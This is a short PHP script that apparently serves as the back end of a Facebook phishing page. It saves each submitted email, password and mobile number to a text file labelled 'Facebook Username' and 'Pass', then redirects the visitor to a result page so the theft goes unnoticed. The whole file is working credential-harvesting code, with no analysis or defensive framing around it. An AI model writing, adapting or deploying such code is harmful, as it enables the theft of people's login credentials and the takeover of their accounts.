<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . $_POST['mobile'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();
?>